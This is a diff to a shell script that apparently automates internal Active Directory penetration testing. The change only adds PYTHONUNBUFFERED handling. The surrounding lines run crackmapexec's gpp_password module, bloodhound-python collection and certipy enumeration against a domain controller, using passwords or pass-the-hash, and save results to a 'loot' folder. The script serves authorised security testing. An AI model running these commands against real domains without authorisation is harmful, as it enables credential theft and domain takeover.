@@ -68,6 +68,7 @@ FQDN=$(nslookup $IP | awk '// {print$4}' | sed 's/.$//')
 if [ -z $HASH ]
 then
  # Use Password
+ export PYTHONUNBUFFERED=TRUE
  # GPP password
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
 
@@ -110,6 +111,9 @@ then
    bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
    certipy find -u $USER -p $PASS -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
+
+#Python unbuffered reset to default
+unset PYTHONUNBUFFERED   
 exit 0
 fi
 
@@ -118,6 +122,7 @@ then
 echo 'HASH is untested EXIT'
 exit 0
  # use HASH
+ export PYTHONUNBUFFERED=TRUE
  # GPP password
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
 
@@ -160,6 +165,8 @@ exit 0
    bloodhound-python -u $USER --hashes aad3b435b51404eeaad3b435b51404ee:$HASH -d $DOM -dc $FQDN -w 50 -c all --zip
    certipy find -u $USER -hashes $HASH -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
+#Python unbuffered reset to default
+unset PYTHONUNBUFFERED
 exit 0    
 fi
 exit 0
